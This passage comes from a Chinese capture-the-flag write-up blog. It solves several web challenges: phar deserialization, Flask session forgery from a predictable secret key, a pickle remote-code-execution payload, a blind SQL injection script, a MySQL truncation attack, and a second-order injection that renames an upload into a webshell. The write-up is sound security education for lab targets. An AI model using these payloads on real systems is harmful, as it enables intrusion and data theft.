class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的<code>phar</code>后缀改为git上传，在<code>delete.php</code>访问<code>phar:lihuaiqiu.gif/test.txt</code></p>
<p><img src="https://s2.ax1x.com/2019/07/13/ZhzyO1.png" alt="ZhzyO1.png"></p>
<p>得到flag。</p>
<h3 id="华东南Web4"><a href="#华东南Web4" class="headerlink" title="华东南Web4"></a>华东南Web4</h3><p>这道题比赛的时候还以为是SSRF..还试了很多ssrf的trick,没想到…其实是HCTF的化简版…</p>
<p>读一下app.py…这个应用程序文件比赛的时候都忘读了，源码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">print</span> str(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>有关键字file和flag的过滤，不能通过file和flag进行传参，但是必须要session的username是fuck才能得到flag。关键代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>uuid.getnode()代表是mac地址，以mac地址为种子产生随机数，这样我们如果得到了mac地址就可以在拿到SECRET_KEY了,进而进行session伪造，这里py2和py3的精度是不一样的，要具体看一下代码是Py2还是Py3，linux下mac地址保存于<code>/sys/class/net/eth0/address</code>，可通过读取拿到mac地址。</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzIyFA.png" alt="ZzIyFA.png"></p>
<p>得到SECRET_KEY,伪造session脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_serializer</span><span class="params">(secret_key)</span>:</span></span><br><span class="line">    signer_kwargs = dict(</span><br><span class="line">        key_derivation=<span class="string">'hmac'</span>,</span><br><span class="line">        digest_method=sha1</span><br><span class="line">    )</span><br><span class="line">    Serializer = URLSafeTimedSerializer(secret_key, salt=<span class="string">'cookie-session'</span>,</span><br><span class="line">                                  signer_kwargs=signer_kwargs)</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'fuck'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> Serializer.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    secret_key = <span class="string">'165.691370347'</span></span><br><span class="line">    <span class="keyword">print</span> session_serializer(secret_key)</span><br></pre></td></tr></table></figure>

<p>得到伪造后的session，发送过去</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzI4eg.png" alt="ZzI4eg.png"></p>
<p>成功得到flag。</p>
<h3 id="IKUN"><a href="#IKUN" class="headerlink" title="IKUN"></a>IKUN</h3><p>利用脚本拿到LV6的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<p>通过改前端discount元素买到，发现不是admin进不去。拿到jwt,解密得到secret为1kun,然后把username变成admin，替换jwt，发现给了源码。此时抓包发现我的传参有一个become参数，在源码里全局搜索一下become，发现如下问题：</p>
<p><img src="https://s2.ax1x.com/2019/07/24/eEhQSg.png" alt="eEhQSg.png"></p>
<p>有一个python反序列化的点，通过渲染拿到form.html的become元素的值进行反序列化，但是我们知道在py反序列化时是可以进行代码执行的，不过这道题似乎ban掉了很多命令执行函数，最后可通过command库绕过，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> (commands.getoutput,(<span class="string">'ls /'</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p>发现flag位置在<code>/flag.txt</code>，再cat一下flag.txt即可得到flag。</p>
<p><img src="https://s2.ax1x.com/2019/07/24/eE5rIx.png" alt="eE5rIx.png"></p>
<h3 id="国赛Easyweb"><a href="#国赛Easyweb" class="headerlink" title="国赛Easyweb"></a>国赛Easyweb</h3><p>国决的一道题，当时给了源码，所以做的还是蛮快的，现在思考一下这道题的正确做法，代码大概看一遍，问题还在image.php，问题代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) ? $_GET[<span class="string">"id"</span>] : <span class="string">"1"</span>;</span><br><span class="line">$path = <span class="keyword">isset</span>($_GET[<span class="string">"path"</span>]) ? $_GET[<span class="string">"path"</span>] : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id = addslashes($id);</span><br><span class="line">$path = addslashes($path);</span><br><span class="line"></span><br><span class="line">$id = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $id);</span><br><span class="line">$path = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $path);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/load/i"</span>, $sql)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">//secure the path</span></span><br><span class="line">$count = preg_match(<span class="string">"/(\.\.)|(config)/i"</span>, $row[<span class="string">"path"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>大概是能看出来load是被过滤掉了的，防止我们去读取文件，关键的几行代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) ? $_GET[<span class="string">"id"</span>] : <span class="string">"1"</span>;</span><br><span class="line">$path = <span class="keyword">isset</span>($_GET[<span class="string">"path"</span>]) ? $_GET[<span class="string">"path"</span>] : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id = addslashes($id);</span><br><span class="line">$path = addslashes($path);</span><br><span class="line"></span><br><span class="line">$id = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $id);</span><br><span class="line">$path = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $path);</span><br><span class="line">$sql = <span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/load/i"</span>, $sql)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先转义后置空？？？本地调一下</p>
<p><img src="https://s2.ax1x.com/2019/09/03/nALeAS.png" alt="nALeAS.png"></p>
<p>如果先转义的话最后留下一个<code>\</code>的话其实就会把后面的<code>&#39;</code>转义掉，最后的形式为</p>
<p>select * from images where id =’xxxx or path’ +注入语句</p>
<p>所以path的地方就是我们要注入的地方了，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		url=<span class="string">"http://38a73077-7ff7-48a9-9414-0927d78dc473.node1.buuoj.cn/image.php?id=1\\0&amp;path=and%20if(ascii(mid(user(),1,1))=&#123;&#125;,0,1)--+"</span>.format(j)</span><br><span class="line">		r=requests.get(url)</span><br><span class="line">		<span class="keyword">print</span> url</span><br><span class="line">		<span class="keyword">if</span> r.text==<span class="string">""</span>:</span><br><span class="line">			<span class="keyword">print</span> chr(j)</span><br></pre></td></tr></table></figure>

<p>这里就是个大概的验证思路脚本，网速有点慢，就没跑，之后的地方就比较简单的，文件名短标签getshell。</p>
<h3 id="FBCTF-products-manager"><a href="#FBCTF-products-manager" class="headerlink" title="FBCTF-products manager"></a>FBCTF-products manager</h3><p>首先给了源码，大概也看了一遍，一共三个功能。</p>
<ul>
<li>添加产品信息</li>
<li>通过给出的名字以及密码查看特定的产品信息</li>
<li>查看前五个产品的名字</li>
</ul>
<p>大概审计了一遍代码，发现注入过程用的都用了预处理，很难直接去注入，但是看到insert和后面的select】的联动就想起了Mysql约束攻击，当时手滑…谷歌的记录输入，直接在登陆时候输入的是facebook+n个空格+1了….，没注意到，还以为输入的是facebook，后来才发现这个问题，还是先看看你漏洞代码吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_post</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $_POST;</span><br><span class="line"></span><br><span class="line">  $name = $_POST[<span class="string">"name"</span>];</span><br><span class="line">  $secret = $_POST[<span class="string">"secret"</span>];</span><br><span class="line">  $description = $_POST[<span class="string">"description"</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($name) &amp;&amp; $name !== <span class="string">""</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>($secret) &amp;&amp; $secret !== <span class="string">""</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>($description) &amp;&amp; $description !== <span class="string">""</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (validate_secret($secret) === <span class="keyword">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"Invalid secret, please check requirements"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$product = get_product($name);</span><br><span class="line"><span class="keyword">if</span> ($product !== <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"Product name already exists, please enter again"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insert_product($name, hash(<span class="string">'sha256'</span>, $secret), $description);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Product has been added&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里只对secret进行了一些检测，其他的倒是没管</p>
<p>跟进insert_product看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_product</span><span class="params">($name, $secret, $description)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"INSERT INTO products (name, secret, description) VALUES</span></span><br><span class="line"><span class="string">      (?, ?, ?)"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"sss"</span>, $name, $secret, $description);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是赤裸裸的预处理插入，再看一下后面的view</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"s"</span>, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样是赤裸裸的查看，这里就很满足Mysql约束攻击的条件了，下面详细说一下这个攻击的具体流程</p>
<p>原理是利用Mysql中select的时候</p>
<p><img src="https://s2.ax1x.com/2019/09/04/nZYY3q.png" alt="nZYY3q.png"></p>
<p>这里可以看出加完空格其实和没加空格是一样的，那么我们可以先注册一个facebook+50*空格+1,这里可以防止先进行select查询出相同的用户名(这里没有，然后insert插入是有长度限制的，所以插入的其实就是facebook+空格，放入Mysql中，最后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT name, description FROM products WHERE name &#x3D; ?&quot;</span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<p>这里其实当时还有个疑问，为什么我当时插入的数据没拿到呢，后来看了一下fetch_assoc</p>
<p>这个函数，发现了问题，手册解释如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch_assoc(), 以一个关联数组方式抓取一行结果</span><br></pre></td></tr></table></figure>

<p>这样就很清楚了。</p>
<p>最后总结一下mysql约束攻击在实战与CTF中的利用</p>
<p>其实mysql约束攻击最多用的地方就是在登陆处，伪造admin的身份去看看后台</p>
<p>像这道题为了出题而这么用mysql约束攻击我觉得似乎没有什么意义..，如下这段代码我就比较吐槽..</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$statement = $db-&gt;prepare(</span><br><span class="line">   <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>

<p>这么搞意思不就是去配合二次注入吗…</p>
<p>这里稍微思考了一个问题</p>
<p>常用的约束攻击实现登陆，是如果满足admin这个身份，就跳到属于admin的后台页面，但是如果我给<code>admin realpasswd</code>这个对应的那条数据加上一个独一无二的数据呢，那我们还能轻易拿到他的数据吗，很明显是不会的，这和Mysql的默认排序是有很大关系的，这道题应该是这么设计出取第一条数据正好对应的flag的描述，<strong>所以用约束攻击去绕过admin身份登陆才是最合理的一个过程，另外在看到插入和select出数据的这两个过程，应该很敏感的去反应到约束攻击</strong>。</p>
<h3 id="Filemanager"><a href="#Filemanager" class="headerlink" title="Filemanager"></a>Filemanager</h3><p>看注释似乎是ph牛出的一道题，蛮有意思，与其说他是一道二次注入，不如说这是一个逻辑思维漏洞，接下来就是一些思考过程</p>
<p>在rename.php中有很明显的二次注入点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">	$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		$result = $result-&gt;fetch_assoc();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line"></span><br><span class="line">	$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">	$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">		print_r($db-&gt;error);                       <span class="comment">//filename=../delete',extension='.php</span></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">	$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">	<span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">		rename($oldname, $newname);</span><br><span class="line">	&#125;</span><br><span class="line">	$url = <span class="string">"/"</span> . $newname;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单独放出来看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>)</span><br></pre></td></tr></table></figure>

<p>闭合一下oldname就可以为所欲为了，能注入了接下来能干嘛呢，首先看看数据库里有没有flag，大概看了一下xdctf.sql，感觉没什么希望，那既然能上传文件，可能就和拿shell有关吧，盯着这条语句仔细思考了一下，首先想到的自然是堆叠注入，但是试了一下，似乎没成功。</p>
<p>接着思考了一下， 这个闭合代表着我可以控制很多字段了，filename,extension字段等我都能控制，那么我通过改后缀去拿shell应该不难，首先我试的是直接把后缀改成php，后来发现不太行</p>
<p>因为在rename前面是有一个file_exists的判断的，目前是不存在x.php的，所以直接改成php肯定不行，在file_exists判断的时候一定要拿到一个存在的文件，那么我们把后缀设置为空，自己写文件名不就行了吗</p>
<p>具体过程：</p>
<p>上传一个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;,filename&#x3D;&#39;lihuaiqiu.png&#39;,extension&#x3D;&#39;.png</span><br></pre></td></tr></table></figure>

<p>里面写好shell，接着通过rename：lihuaiqiu</p>
<p>然后再rename,填写内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old: lihuaiqiu.png</span><br><span class="line"></span><br><span class="line">new: lihuaiqiu.php</span><br></pre></td></tr></table></figure>

<p>成功拿到shell。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/13/BUUCTF-Writeup-%D2%BB/" data-id="ckabsu37w000mkkvr0cpm1b6f" class="article-share-link" data-share="baidu" data-title="BUUCTF-Writeup(一)">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/13/BUUCTF-Writeup-%D2%BB/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-php-session配置不当产生的安全问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
